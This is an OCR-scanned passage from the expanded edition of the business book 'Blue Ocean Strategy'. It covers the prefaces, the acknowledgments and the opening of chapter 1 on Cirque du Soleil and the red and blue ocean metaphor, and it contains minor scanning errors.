My Ocean Is Turning Red\n\n“HELP! My OCEAN IS TURNING RED” captures the sentiment echoed so\nfrequently by managers around the world. More and more people, whether\nmanagers of companies, heads of nonprofits, or leaders of government, find\nthemselves up against an ocean of bloody competition and want to get out.\nMaybe your business is seeing its margins shrink. Maybe competition is\ngetting more intense, driving commoditization of your offering and rising\ncosts. Maybe you know you are going to announce that salary increases\nwon’t be coming. That’s not a situation any one of us wants to face. And yet\nthat’s a situation that so many do face.\n\nHow can you address this challenge? The lessons, tools, and frameworks\nof Blue Ocean Strategy will help you to meet this challenge, whatever\nindustry or economic sector you are in. It shows how you can get out of a\nred ocean of bloody competition and into a blue ocean of uncontested\nmarket space characterized by new demand and strong profitable growth.\n\nWhen we wrote Blue Ocean Strategy, we used the metaphor of red and\nblue oceans because red oceans seemed to capture the reality that\norganizations increasingly face, while blue oceans captured the endless\npossibility that organizations could create, as industry history has borne out\nsince its inception. Today, ten years later, more than 3.5 million copies of\nthe book have been sold. It has become a bestseller across five continents. It\nhas been translated into a record-breaking forty-three languages. And the\nterm “blue ocean” has entered the business vernacular. Over four thousand\narticles and blog posts on blue ocean strategy have come out, with new\narticles continuing to appear daily worldwide.\nThe stories they contain are fascinating. There are articles from small\nbusiness owners and individuals across the globe that discuss how the book\nfundamentally changed their perspectives on life and took their professional\nsuccesses to all new levels. In other articles, executives speak of how blue\nocean strategy provided the insight to take their business out of the red\nocean and create all new demand. And yet other articles detail how\ngovernment leaders have applied blue ocean strategy to achieve high impact\nat low cost with rapid execution in areas of social importance ranging from\nenhancing the quality of rural and urban lives, to strengthening internal and\n\nexternal securities, to breaking down ministerial and regional silos.!\n\nAs we have reached out to organizations that have applied the ideas and\nhave worked with many directly since the publication of the original edition\nof Blue Ocean Strategy, we have learned a lot by watching the journey\npeople have made with these ideas. Their most pressing questions in\nexecuting their blue ocean strategies are: How do we align all of our\nactivities around our blue ocean strategy? What do we do when our blue\nocean has become red? How can we avoid the strong gravitational pulls of\n“red ocean thinking”—we call them “red ocean traps” —even as we’re\npursuing a blue ocean strategy? These are the very questions that have\nmotivated this expanded edition. In this new preface, we first outline what’s\nnew here. We then briefly summarize the key points that define and\ndistinguish blue ocean strategy and address why we believe blue ocean\nstrategy is more needed and relevant than ever before.\nWhat’s New in This Expanded Edition?\n\nThis edition adds two new chapters and expands a third. Here are the\nhighlights that show the gist of managers’ key challenges and trouble spots\nand how we address them.\n\nAlignment: What it means, why it’s essential, and how to achieve it. A\nchallenge we have been told about and have seen organizations struggle\nwith is how they can align their system of activities—including a potential\nweb of external partners—to create a sustainable blue ocean strategy in\npractice. Is there a simple yet comprehensive method to ensure that the key\ncomponents of an organization, from value to profit to people, are aligned\nto support the strategic shift blue ocean strategy requires? This is important\nas companies all too often focus on certain dimensions of their\norganizations, paying less heed to other dimensions that must support the\nstrategy to make it a sustainable success. In recognition, this expanded\nedition expressly explores the issue of alignment in the context of blue\noceans. We present cases of success and failure in alignment to show not\nonly how it is achieved in action but also how it can be missed. Chapter 9\naddresses this alignment challenge.\n\nRenewal: When and how to renew blue oceans over time. All\ncompanies rise and fall based on the strategic moves they make or don’t\nmake. A challenge organizations face is how to renew blue oceans over\ntime, as every blue ocean will eventually be imitated and turn red.\nUnderstanding the process of renewal is key to ensure that the creation of\nblue oceans is not a one-off occurrence but can be institutionalized as a\nrepeatable process in an organization. In this expanded edition, we tackle\nhow leaders can turn the creation of blue oceans from a static achievement\ninto a dynamic renewal process both at the business level and at the\ncorporate level for multibusiness firms. Here we articulate the dynamic\nrenewal process for creating sustainable economic performance both for a\nsingle business that has reached for a blue ocean and for a multibusiness\norganization that has to balance both red and blue ocean initiatives. In so\ndoing, we also highlight the complementary roles that red and blue ocean\nstrategies play in managing a company’s profit for today while building\nstrong growth and brand value for tomorrow. Chapter 10 addresses this\nrenewal challenge.\n\nRed Ocean Traps: What they are and why they should be avoided.\nLastly, we show the ten most-common red ocean traps we see companies\nfall into as they put blue ocean strategy into practice. These traps keep\ncompanies anchored in the red even as they attempt to set sail for the blue.\nAddressing these traps is critical to getting people’s framing right to create\nblue oceans. With the proper grasp of the concept, one can avoid the traps\nand apply its associated tools and methodologies with accuracy so that right\nstrategic actions can be produced to sail toward clear blue waters. Chapter\n11 addresses the challenge of red ocean traps.\nWhat Are the Main Points of Distinction?\n\nThe aim of blue ocean strategy was straightforward: to allow any\norganization—large or small, new or incumbent—to step up to the\nchallenge of creating blue oceans in an opportunity-maximizing, risk-\nminimizing way. The book challenges several long-held beliefs in the field\nof strategy. If we had to zoom in on five key points of distinction that make\nthe book worthy of consideration, it would be these.\n\nCompetition should not occupy the center of strategic thinking. Too\nmany companies let competition drive their strategies. What blue ocean\nstrategy brings to life, however, is that this focus on the competition all too\noften keeps companies anchored in the red ocean. It puts the competition,\nnot the customer, at the core of strategy. As a result, companies’ time and\nattention get focused on benchmarking rivals and responding to their\nstrategic moves, rather than on understanding how to deliver a leap in value\nto buyers—which is not the same thing.\n\nBlue ocean strategy breaks from the stranglehold of competition. At the\nbook’s core is the notion of a shift from competing to creating new market\nspace and hence making the competition irrelevant. We first made this point\nall the way back in 1997 in “Value Innovation,” the first of our series of\nHarvard Business Review articles that form the basis of this book.” We\nobserved that companies that break away from the competition pay little\nheed to matching or beating rivals or carving out a favorable competitive\nposition. Their aim was not to outperform competitors. It was to offer a\nquantum leap in value that made the competition irrelevant. The focus on\ninnovating at value, not positioning against competitors, drives companies\nto challenge all the factors an industry competes on and to not assume that\njust because the competition is doing something means it is connected to\nbuyer value.\n\nIn this way, blue ocean strategy makes sense of the strategic paradox\nmany organizations face: the more they focus on coping with the\ncompetition, and striving to match and beat their advantages, the more they\nironically tend to look like the competition. To which blue ocean strategy\nwould respond, stop looking to the competition. Value-innovate and let the\ncompetition worry about you.\nIndustry structure is not given; it can be shaped. The field of strategy\nhas long assumed that industry structure is given. With industry structure\nseen as fixed, firms are driven to build their strategies based on it. And so\nstrategy, as is commonly practiced, tees off with industry analysis—think\nfive forces or its distant precursor SWOT analysis—where strategy is about\nmatching a company’s strengths and weaknesses to the opportunities and\nthreats present in the existing industry. Here strategy perforce becomes a\nzero-sum game where one company’s gain is another company’s loss, as\nfirms are bound by existing market space.\n\nBlue ocean strategy, by contrast, shows how strategy can shape structure\nin an organization’s favor to create new market space. It is based on the\nview that market boundaries and industry structure are not given and can be\nreconstructed by the actions and beliefs of industry players. As industry\nhistory shows, new market spaces are being created every day and are fluid\nwith imagination. Buyers prove that as they trade across alternative\nindustries, refusing to see or be constrained by the cognitive boundaries\nindustries impose upon themselves. And firms prove that as they invent and\nreinvent industries, collapsing, altering, and going beyond existing market\nboundaries to create all new demand. In this way, strategy moves from a\nzero-sum to a non-zero-sum game, and even an unattractive industry can be\nmade attractive by companies’ conscious efforts. Which is to say a red\nocean need not stay red. This brings us to a third point of distinction.\n\nStrategic creativity can be unlocked systematically. Ever since\nSchumpeter’s vision of the lone and creative entrepreneur, innovation and\ncreativity have been essentially viewed as a black box, unknowable and\nrandom.> Not surprisingly, with innovation and creativity viewed as such,\nthe field of strategy predominantly focused on how to compete in\nestablished markets, creating an arsenal of analytic tools and frameworks to\nskillfully achieve this. But is creativity a black box? When it comes to\nartistic creativity or scientific breakthroughs—think Gaudi’s majestic art or\nMarie Curie’s radium discovery—the answer may be yes. But is the same\ntrue for strategic creativity that drives value innovation that opens up new\nmarket spaces? Think Ford’s Model T in autos, Starbucks in coffee, or\nSalesforce.com in CRM software. Our research suggests no. It revealed\ncommon strategic patterns behind the successful creation of blue oceans.\nThese patterns allowed us to develop underlying analytic frameworks, tools,\nand methodologies to systematically link innovation to value and\nreconstruct industry boundaries in an opportunity-maximizing, risk-\nminimizing way. While luck, of course, will always play a role, as it does\nwith all strategies, these tools—like the strategy canvas, four actions\nframework, and six paths to reconstruct market boundaries—bring structure\nto what has historically been an unstructured problem in strategy, informing\norganizations’ ability to create blue oceans systematically.\n\nExecution can be built into strategy formulation. Blue ocean strategy is\na strategy that joins analytics with the human dimension of organizations. It\nrecognizes and pays respect to the importance of aligning people’s minds\nand hearts with a new strategy so that at the level of the individual, people\nembrace it of their own accord and willingly go beyond compulsory\nexecution to voluntary cooperation in carrying it out. To achieve this, blue\nocean strategy does not separate strategy formulation from execution.\nAlthough this disconnect may be a hallmark of most companies’ practices,\nour research shows it is also a hallmark of slow and questionable\nimplementation and mechanical follow-through at best. Instead, blue ocean\nstrategy builds execution into strategy from the start through the practice of\nfair process in the making and rolling out of strategy.\n\nOver twenty-five years, we have written about the impact of fair process\non the quality of execution of decisions through many academic and\nmanagerial publications.’ As blue ocean strategy brings to light, fair process\nprepares the ground for implementation by invoking the most fundamental\nbasis of action: trust, commitment, and the voluntary cooperation of people\ndeep in an organization. Commitment, trust, and voluntary cooperation are\nnot merely attitudes or behaviors. They are intangible capital. They allow\ncompanies to stand apart in the speed, quality, and consistency of their\nexecution and to implement strategic shifts fast at low cost.\n\nA step-by-step model for creating strategy. The field of strategy has\nproduced a wealth of knowledge on the content of strategy. However, what\nit has remained virtually silent on is the key question of how to create a\nstrategy to begin with. Of course, we know how to produce plans. But, as\nwe all know, the planning process doesn’t produce strategy. In short, we\ndon’t have a theory of strategy creation.\nWhile there are many theories that explain why companies fail and\nsucceed, they are mostly descriptive, not prescriptive. There is no step-by-\nstep model that prescribes in specific terms how companies can formulate\nand execute their strategies to obtain high performance. Such a model is\nintroduced here in the context of blue oceans to show how companies can\navoid market-competing traps and achieve market-creating innovations.\nThe strategy-making framework we advance here is built based on our\nstrategy practices in the field with many companies over the last two\ndecades. It helps managers in action as they formulate strategies that are\ninnovative and wealth creating.\nWhy Is Blue Ocean Strategy of Rising Importance?\n\nWhen we first published Blue Ocean Strategy in 2005, there were many\nforces driving the importance of creating blue oceans. At the top of the list\nwas the fact that competition in existing industries was getting fiercer and\npressure on costs and profits was increasing. These forces have not gone\naway. On the contrary, they’ve only intensified. But beyond these, over the\nlast ten years, several new global trends have kicked in with a speed few\ncould have ever imagined when our book first came out. We believe that\nthese trends make creating blue oceans an even more important strategic\ntask in the future. Here, we highlight some of them without intending to be\ncomprehensive in their coverage or content.\n\nA rising call for creative new solutions. Just look at a broad swath of\nindustries that matter fundamentally to who we are: health care, K-12\neducation, universities, financial services, energy, the environment, and the\ngovernment, where demands are high yet money and budgets are low. In the\nlast ten years, every one of these industries has been seriously called to task.\nThere has hardly been a time in history when the strategies of players in so\nmany industries and sectors needed fundamental rethinking. To remain\nrelevant, all these players are increasingly being called on to reimagine their\nstrategies to achieve innovative value at lower costs.\n\nThe rising influence and use of public megaphones. It’s hard to believe,\nbut only ten years back, organizations still controlled the majority of\ninformation disseminated to the public on their products, services, and\nofferings. Today that’s history. The surge in social network sites, blogs,\nmicro-blogs, video-sharing services, user-driven content, and internet\nratings that have become close to ubiquitous around the globe have shifted\nthe power and credibility of voice from organizations to individuals. To not\nbe a victim but a victor in this new reality, your offering needs to stand out\nas never before. That’s what gets people tweeting your praises not your\nfaults; giving five-star ratings; clicking the thumbs up, not the thumbs\ndown; listing your offering as a favorite on social media sites; and even\nbeing inspired to positively blog about your offering. You can’t hide or\novermarket your me-too offering when virtually everyone has a global\nmegaphone.\nA locational shift in future demand and growth. When people around\nthe world talk about the growth markets of the future, Europe and Japan\nhardly get a mention these days. Even the United States, though still the\nlargest economy in the world, has increasingly taken a backseat in terms of\nfuture growth prospects. Instead, today China and India, not to mention\ncountries like Brazil, top the list. In the space of the last ten years, all three\nhave joined the ranks of the top-ten largest economies. However, this new\nbreed of big economies is not like the large economies the world has\nhistorically looked to and counted on to consume the goods and services\nproduced by the world. Unlike the relatively high per capita incomes\nenjoyed in the world’s developed economies, these big emerging markets\nare the product of very low, though rising, per capita income for very large\npopulations of citizens. This makes the importance of affordable low cost in\norganizations’ offerings more critical than before. But do not be fooled.\nLow cost alone is not enough. For these same large populations also have\nincreasing access to the internet, mobile phones, and TVs with global\nchannels that raise their sophistication, demands, and desires. To capture\nthese increasingly savvy customers’ imaginations and wallets, both\ndifferentiation and low cost are needed.\n\nThe rising speed and easiness of becoming a global player. Historically,\nthe major global companies came predominantly from the United States,\nEurope, and Japan. But that is changing at incredible speed. Over the last\nfifteen years, the number of companies from China in the Fortune Global\n500 has increased more than twenty times, the number of Indian companies\nhas increased roughly eightfold, and the number of Latin American\ncompanies more than doubled. This suggests that these big emerging\neconomies do not only represent oceans of new demand to unlock. They\nalso represent oceans of new potential competitors with global ambitions no\ndifferent than Toyota’s, General Electric’s, or Unilever’s.\n\nBut it’s not just companies from these big emerging markets that are on\nthe rise. That is just a tip of the iceberg of what the future portends. In the\nlast decade, there has been a fundamental shift in the cost and ease of\nbecoming a global player from virtually any corner of the globe. This is a\ntrend no organization can afford to downplay. Consider just a handful of\nfacts. With the ease and low cost of setting up a website, any business can\nhave a global storefront; today people from anywhere can raise money via\ncrowdfunding; with services like Gmail and Skype, communication costs\nhave dropped significantly; trust in transactions can now be rapidly and\neconomically achieved by using services like PayPal, while companies like\nAlibaba.com make searching for and vetting suppliers across the world\nrelatively quick and easy. And there are search engines—the equivalent of\nglobal business directories—that are free. As for global advertising, there is\nTwitter and YouTube where you can market your offerings for free. With\nthe low entry cost to become a global player, new players from virtually all\ncorners of the world can increasingly participate in global markets and offer\ntheir wares or services. While, of course, these trends don’t mitigate all\nbarriers to becoming a global player, they certainly intensify global\ncompetition. To stand apart in these overcrowded markets, you need to be\ncreative through value innovation.\n\nToday both the challenges and opportunities we all face are great. By\nproviding methodologies and tools organizations can apply to pursue blue\noceans, it is our hope that these ideas will help to meet these challenges and\ncreate opportunities so we all come out better. Strategy, after all, is not just\nfor business. It is for everyone—the arts, nonprofits, the public sector, even\ncountries. We invite you to join us on this journey. One thing is clear: the\nworld needs blue oceans.\nPreface to the Original Edition\n\nTuis Is A BOOK about friendship, about loyalty, about believing in one\n\nanother. It was because of that friendship, and that belief, that we set out on\nthe journey to explore the ideas in this book and eventually came to write it.\n\nWe met twenty years ago in a classroom—one the professor, the other the\nstudent. And we have worked together ever since, often seeing ourselves\nalong the journey as two wet rats in a drain. This book is not the victory of\nan idea but of a friendship that we have found more meaningful than any\nidea in the world of business. It has made our lives rich and our worlds\nmore beautiful. We were not alone.\n\nNo joumey is easy; no friendship is filled only with laughter. But we\nwere excited every day of that journey because we were on a mission to\nlearn and improve. We believe passionately in the ideas in this book. These\nideas are not for those whose ambition in life is to get by or merely to\nsurvive. That was never an interest of ours. If you can be satisfied with that,\ndo not read on. But if you want to make a difference, to create a company\nthat builds a future where customers, employees, shareholders, and society\nwin, read on. We are not saying it is easy, but it is worthwhile.\n\nOur research confirms that there are no permanently excellent\ncompanies, just as there are no permanently excellent industries. As we\nhave found on our own tumbling road, we all, like corporations, do smart\nthings and less-than-smart things. To improve the quality of our success we\nneed to study what we did that made a positive difference and understand\nhow to replicate it systematically. That is what we call making smart\nstrategic moves, and we have found that the strategic move that matters\ncentrally is to create blue oceans.\n\nBlue ocean strategy challenges companies to break out of the red ocean\nof bloody competition by creating uncontested market space that makes the\ncompetition irrelevant. Instead of dividing up existing—and often shrinking\n—demand and benchmarking competitors, blue ocean strategy is about\ngrowing demand and breaking away from the competition. This book not\nonly challenges companies but also shows them how to achieve this. We\nfirst introduce a set of analytical tools and frameworks that show you how\nto systematically act on this challenge, and, second, we elaborate the\nprinciples that define and separate blue ocean strategy from competition-\nbased strategic thought.\n\nOur aim is to make the formulation and execution of blue ocean strategy\nas systematic and actionable as competing in the red waters of known\nmarket space. Only then can companies step up to the challenge of creating\nblue oceans in a smart and responsible way that is both opportunity\nmaximizing and risk minimizing. No company—large or small, incumbent\nor new entrant—can afford to be a riverboat gambler. And no company\nshould.\n\nThe contents of this book are based on more than fifteen years of\nresearch, data stretching back more than a hundred years, and a series of\nHarvard Business Review articles as well as academic articles on various\ndimensions of this topic. The ideas, tools, and frameworks presented here\nhave been further tested and refined over the years in corporate practice in\nEurope, the United States, and Asia. This book builds on and extends this\nwork by providing a narrative arc that draws these ideas together to offer a\nunified framework. This framework addresses not only the analytic aspects\nbehind the creation of blue ocean strategy but also the all-important human\naspects of how to bring an organization and its people on this journey with a\nwillingness to execute these ideas in action. Here, understanding how to\nbuild trust and commitment, as well as an understanding of the importance\nof intellectual and emotional recognition, are highlighted and brought to the\ncore of strategy.\n\nBlue ocean opportunities have been out there. As they have been\nexplored, the market universe has been expanding. This expansion, we\nbelieve, is the root of growth. Yet poor understanding exists both in theory\nand in practice as to how to systematically create and capture blue oceans.\nWe invite you to read this book to learn how you can be a driver of this\nexpansion in the future.\nAcknowledgments\n\nWE HAVE HAD SIGNIFICANT help in actualizing this book. INSEAD has\nprovided a unique environment in which to conduct our research. We have\nbenefited greatly from the crossover between theory and practice that exists\nat INSEAD, and from the truly global composition of our faculty, student,\nand executive education populations. Deans Antonio Borges, Gabriel\nHawawini, and Ludo Van der Heyden provided encouragement and\ninstitutional support from the start and allowed us to closely intertwine our\nresearch and teaching. PricewaterhouseCoopers (PwC) and the Boston\nConsulting Group (BCG) have extended the financial support for our\nresearch; in particular, Frank Brown and Richard Baird at PwC, and René\nAbate, John Clarkeson, George Stalk, and Olivier Tardy of BCG have been\nvalued partners.\n\nWhile we had help from a highly talented group of researchers over the\nyears, our two dedicated research associates, Jason Hunter and Ji Mi, who\nhave worked with us for the last several years, deserve special mention.\nTheir commitment, persistent research support, and drive for perfection,\nwere essential in realizing this book. We feel blessed by their presence.\n\nOur colleagues at the school have contributed to the ideas in the book.\nINSEAD faculty members, particularly Subramanian Rangan and Ludo Van\nder Heyden, helped us to reflect upon our ideas and offered valuable\ncomments and support. Many of INSEAD’s faculty have taught the ideas\nand frameworks in this book to executive and MBA audiences, providing\nvaluable feedback that sharpened our thinking. Others have provided\nintellectual encouragement and the energy of kindness. We thank here,\namong others, Ron Adner, Jean-Louis Barsoux, Ben Bensaou, Henri-Claude\nde Bettignies, Mike Brimm, Laurence Capron, Marco Ceccagnoli, Karel\nCool, Arnoud De Meyer, Ingemar Dierickx, Gareth Dyas, George Eapen,\nPaul Evans, Charlie Galunic, Annabelle Gawer, Javier Gimeno, Dominique\nHéau, Neil Jones, Philippe Lasserre, Jean-Frangois Manzoni, Jens Meyer,\nClaude Michaud, Deigan Morris, Quy Nguyen-Huy, Subramanian Rangan,\nJonathan Story, Heinz Thanheiser, Ludo Van der Heyden, David Young,\nPeter Zemsky, and Ming Zeng.\n\nWe have been fortunate to have a network of practitioners and case\nwriters across the globe. They have contributed greatly in showing how the\nideas in this book apply in action and helping to develop case material for\nour research. Among many people, one deserves special mention: Marc\nBeauvois-Coladon, who has worked with us from the start and made a\nmajor contribution to chapter 4 based on his field experiences practicing our\nideas in companies. Among the wealth of others, we would like to thank\nFrancis Gouillart and his associates; Gavin Fraser and his associates; Wayne\nMortensen; Brian Marks; Kenneth Lau; Yasushi Shiina; Jonathan Landrey\nand his associates; Junan Jiang; Ralph Trombetta and his associates; Gabor\nBurt and his associates; Shantaram Venkatesh; Miki Kawawa and her\nassociates; Atul Sinha and his associates; Arnold Izsak and his associates;\nVolker Westermann and his associates; Matt Williamson; and Caroline\nEdwards and her associates. We also appreciate the emerging cooperation\nwith Accenture as kicked off with Mark Spelman, Omar Abbosh, Jim\nSayles, and their team. Thanks are also due to Lucent Technologies for their\nsupport.\n\nDuring the course of our research, we have met with corporate executives\nand public officers around the world who generously gave us their time and\ninsight, greatly shaping the ideas in this book. We are grateful to them.\nAmong many private and public initiatives for putting our ideas into\npractice, the Value Innovation Program (VIP) Center at Samsung\nElectronics and the Value Innovation Action Tank (VIAT) in Singapore for\nthe country’s government and private sectors have been major sources of\ninspiration and learning. In particular, Jong-Yong Yun at Samsung\nElectronics and all the Permanent Secretaries of Singapore Government\nhave been valued partners. Warm thanks also to the members of the Value\nInnovation Network (VIN), a global community of practice on the Value\nInnovation family of concepts—especially to those we were unable to\nmention here.\n\nFinally, we would like to thank Melinda Merino, our editor, for her wise\ncomments and editorial feedback, and the Harvard Business School\nPublishing team for their commitment and enthusiastic support. Thanks also\nto our present and past editors at Harvard Business Review, in particular\nDavid Champion, Tom Stewart, Nan Stone, and Joan Magretta. We owe a\ngreat deal to INSEAD MBAs and PhDs and executive education\nparticipants. Particularly, participants in both Strategy and Value Innovation\nStudy Group (VISG) courses have been patient as we have tried out the\nideas in this book. Their challenging questions and thoughtful feedback\nclarified and strengthened our ideas.\n\nSince the publication of the first edition of our book, many people in\naddition to those originally cited in our acknowledgments deserve mention\nfor their support and contribution over the last ten years. Dean Frank Brown\nhad a vision to establish the INSEAD Blue Ocean Strategy Institute\n(01031) and deans Ilian Mihov and Peter Zemsky have continued to\nsupport its growth. With our deans’ vision and support, we have been able\nto create many blue ocean strategy (BOS) programs for INSEAD\nexecutives and MBAs based on theory-based movies, a new pedagogical\napproach that aims to complement conventional paper cases for classroom\ndiscussions. We are grateful for all our faculty who have taught the BOS\ntheory, simulation, and study courses in the MBA, EMBA, and executive\nprograms of INSEAD. Among the faculty not already cited are professors\nAndrew Shipilov, Fares Boulos, Guoli Chen, Ji Mi, Michael Shiel, James\nCostantini, and Lauren Mathys. Fellows and researchers in addition to those\nalready cited who deserve special mention are Zunaira Munir, Oh Young\nKoo, Katrina Ling, Michael Olenick, Zoé McKay, Jee-eun Lee, Olivier\nHenry, and Kinga Petro. We appreciate their support in creating blue ocean\nstrategy teaching materials, industry studies, and apps. We would also like\nto thank the Beaucourt Foundation for its generous financial support of our\nresearch.\nAmong many public and nonprofit initiatives for putting our ideas into\npractice, the Malaysia Blue Ocean Strategy Institute (MBOSI) and\nPresident Obama’s White House Initiative on Historically Black Colleges\nand Universities have provided new impetus for us to apply and expand our\nBOS theory into areas of leadership, entrepreneurship, and the nonprofit\nsector. We are grateful for, among others, all country leaders of Malaysia in\nboth public and private sectors and for the President’s Board of Advisors on\nHistorically Black Colleges and Universities.

In less than twenty years since\nits creation, Cirque du Soleil achieved a level of revenues that took\nRingling Bros. and Barnum & Bailey—the once global champion of the\ncircus industry—more than one hundred years to attain.\n\nWhat makes this growth all the more remarkable is that it was not\nachieved in an attractive industry but rather in a declining industry in which\ntraditional strategic analysis pointed to limited potential for growth.\nSupplier power on the part of star performers was strong. So was buyer\npower. Alternative forms of entertainment—ranging from various kinds of\nurban live entertainment to sporting events to home entertainment—cast an\nincreasingly long shadow. Children cried out for video games rather than a\nvisit to the traveling circus. Partially as a result, the industry was suffering\nfrom steadily decreasing audiences and, in turn, declining revenue and\nprofits. There was also increasing sentiment against the use of animals in\ncircuses by animal rights groups. Ringling Bros. and Barnum & Bailey had\nlong set the standard, and competing smaller circuses essentially followed\nwith scaled-down versions. From the perspective of competition-based\nstrategy, then, the circus industry appeared unattractive.\n\nAnother compelling aspect of Cirque du Soleil’s success is that it did not\nwin by taking customers from the already shrinking circus industry, which\nhistorically catered to children. Cirque du Soleil did not compete with\nRingling Bros. and Barnum & Bailey. Instead it created uncontested new\nmarket space that made the competition irrelevant. It appealed to a whole\nnew group of customers: adults and corporate clients prepared to pay a\nprice several times as great as traditional circuses for an unprecedented\nentertainment experience. Significantly, one of the first Cirque productions\nwas titled “We Reinvent the Circus.”\nNew Market Space\n\nCirque du Soleil succeeded because it realized that to win in the future,\ncompanies must stop competing with each other. The only way to beat the\ncompetition is to stop ¢rying to beat the competition.\n\nTo understand what Cirque du Soleil achieved, imagine a market\nuniverse composed of two sorts of oceans: red oceans and blue oceans. Red\noceans represent all the industries in existence today. This is the known\nmarket space. Blue oceans denote all the industries not in existence today.\nThis is the unknown market space.\n\nIn the red oceans, industry boundaries are defined and accepted, and the\ncompetitive rules of the game are known.! Here, companies try to\noutperform their rivals to grab a greater share of existing demand. As the\nmarket space gets crowded, prospects for profits and growth are reduced.\nProducts become commodities, and cutthroat competition turns the red\nocean bloody.\n\nBlue oceans, in contrast, are defined by untapped market space, demand\ncreation, and the opportunity for highly profitable growth. Although some\nblue oceans are created well beyond existing industry boundaries, most are\ncreated from within red oceans by expanding existing industry boundaries,\nas Cirque du Soleil did. In blue oceans, competition is irrelevant because\nthe rules of the game are waiting to be set.\n\nIt will always be important to swim successfully in the red ocean by\noutcompeting rivals. Red oceans will always matter and will always be a\nfact of business life. But with supply exceeding demand in more industries,\ncompeting for a share of contracting markets, while necessary, will not be\nsufficient to sustain high performance.” Companies need to go beyond\ncompeting. To seize new profit and growth opportunities, they also need to\ncreate blue oceans.\n\nUnfortunately, blue oceans are largely uncharted. The dominant focus of\nstrategy work over the past thirty years has been on competition-based red\nocean strategies.’ The result has been a fairly good understanding of how to\ncompete skillfully in red waters, from analyzing the underlying economic\nstructure of an existing industry, to choosing a strategic position of low cost\nor differentiation or focus, to benchmarking the competition. Some\ndiscussions around blue oceans exist.* However, there is little practical\nguidance on how to create them. Without analytic frameworks to create\nblue oceans and principles to effectively manage risk, creating blue oceans\nhas remained wishful thinking that is seen as too risky for managers to\npursue as strategy. This book provides practical frameworks and analytics\nfor the systematic pursuit and capture of blue oceans.\nThe Continuing Creation of Blue Oceans\n\nAlthough the term b/ue oceans is new, their existence is not. They are a\nfeature of business life, past and present. Look back 120 years and ask\nyourself, How many of today’s industries were then unknown? The answer:\nmany industries as basic as automobiles, music recording, aviation,\npetrochemicals, health care, and management consulting were unheard of or\nhad just begun to emerge at that time. Now turn the clock back only forty\nyears. Again, a plethora of multibillion-and trillion-dollar industries jumps\nout—e-commerce; cell phones; laptops, routers, switches, and networking\ndevices; gas-fired electricity plants; biotechnology; discount retail; express\npackage delivery; minivans; snowboards; and coffee bars to name a few.\nJust four decades ago, none of these industries existed in a meaningful way.\n\nNow put the clock forward twenty years—or perhaps fifty years—and\nask yourself how many now unknown industries will likely exist then. If\nhistory is any predictor of the future, again the answer is many of them.\n\nThe reality is that industries never stand still. They continuously evolve.\nOperations improve, markets expand, and players come and go. History\nteaches us that we have a hugely underestimated capacity to create new\nindustries and re-create existing ones. In fact, the more than half-century-\nold Standard Industrial Classification (SIC) system published by the US\nCensus was replaced in 1997 by the North America Industry Classification\nStandard (NAICS) system. The new system expanded the ten SIC industry\nsectors into twenty sectors to reflect the emerging realities of new industry\nterritories.” The services sector under the old system, for example, is now\nexpanded into seven business sectors ranging from information to health\ncare and social assistance.° Given that these systems are designed for\nstandardization and continuity, such a replacement shows how significant\nthe expansion of blue oceans has been.\n\nYet the overriding focus of strategic thinking has been on competition-\nbased red ocean strategies. Part of the explanation for this is that corporate\nstrategy is heavily influenced by its roots in military strategy. The very\nlanguage of strategy is deeply imbued with military references—chief\nexecutive “officers” in “headquarters,” “troops” on the “front lines.”\nDescribed this way, strategy is about confronting an opponent and fighting\nover a given piece of land that is both limited and constant.’ Unlike war,\nhowever, the history of industry shows us that the market universe has\nnever been constant; rather, blue oceans have continuously been created\nover time. To focus on the red ocean is therefore to accept the key\nconstraining factors of war—limited terrain and the need to beat an enemy\nto succeed—and to deny the distinctive strength of the business world: the\ncapacity to create new market space that is uncontested.\nThe Impact of Creating Blue Oceans\n\nWe set out to quantify the impact of creating blue oceans on a company’s\ngrowth in both revenues and profits in a study of the business launches of\n108 companies (see figure 1-1). We found that 86 percent of the launches\nwere line extensions, that is, incremental improvements within the red ocean\nof existing market space. Yet they accounted for only 62 percent of total\nrevenues and a mere 39 percent of total profits. The remaining 14 percent of\nthe launches were aimed at creating blue oceans. They generated 38 percent\nof total revenues and 61 percent of total profits. Given that business launches\nincluded the total investments made for creating red and blue oceans\n(regardless of their subsequent revenue and profit consequences, including\nfailures), the performance benefits of creating blue waters are evident.\nAlthough we don’t have data on the hit rate of success of red and blue ocean\ninitiatives, the global performance differences between them are marked.\n\nFIGURE 1-1\n\nThe profit and growth consequences of creating blue oceans\n\nBusiness launch | 86% 14%\nProfit impact | 39% 61%\n\n[| Launches within red oceans Launches for creating blue oceans\n\nThe Rising Imperative of Creating Blue Oceans\n\nThere are several driving forces behind a rising imperative to create blue\noceans. Accelerated technological advances have substantially improved\nindustrial productivity and have allowed suppliers to produce an\nunprecedented array of products and services. The result is that in\nincreasing numbers of industries, supply exceeds demand.* The trend\ntoward globalization compounds the situation. As trade barriers between\nnations and regions are dismantled and as information on products and\nprices becomes instantly and globally available, niche markets and havens\nfor monopoly continue to disappear.” While supply is on the rise as global\ncompetition intensifies, there is no clear evidence of an increase in demand\nrelative to supply, and statistics even point to declining populations in many\ndeveloped markets. !°\n\nThe result has been accelerated commoditization of products and\nservices, increasing price wars, and shrinking profit margins. Industrywide\nstudies on major American brands confirm this trend.'! They reveal that for\nmajor product and service categories, brands are generally becoming more\nsimilar, and as they are becoming more similar, people increasingly select\nbased on price.12 People no longer insist, as in the past, that their laundry\ndetergent be Tide. Nor will they necessarily stick to Colgate when Crest is\non sale, and vice versa. In overcrowded industries, differentiating brands\nbecomes harder in both economic upturns and downturns.\n\nAll this suggests that the business environment in which most strategy\nand management approaches of the twentieth century evolved is\nincreasingly disappearing. As red oceans become increasingly bloody,\nmanagement will need to be more concerned with blue oceans than the\ncurrent cohort of managers is accustomed to.\nFrom Company and Industry to Strategic Move\n\nHow can a company break out of the red ocean of bloody competition?\nHow can it create a blue ocean? Is there a systematic approach to achieve\nthis and thereby sustain high performance?\n\nIn search of an answer, our initial step was to define the basic unit of\nanalysis for our research. To understand the roots of high performance, the\nbusiness literature typically uses the company as the basic unit of analysis.\nPeople have marveled at how companies attain strong, profitable growth\nwith a distinguished set of strategic, operational, and organizational\ncharacteristics. Our question, however, was this: Are there /asting\n“excellent” or “visionary” companies that continuously outperform the\nmarket and repeatedly create blue oceans?\n\nConsider, for example, Jn Search of Excellence and Built to Last.'* The\nbestselling book Jn Search of Excellence was published some thirty years\nago. Yet within two years of its publication, a number of the companies\nsurveyed began to slip into oblivion: Atari, Chesebrough-Pond’s, Data\nGeneral, Fluor, National 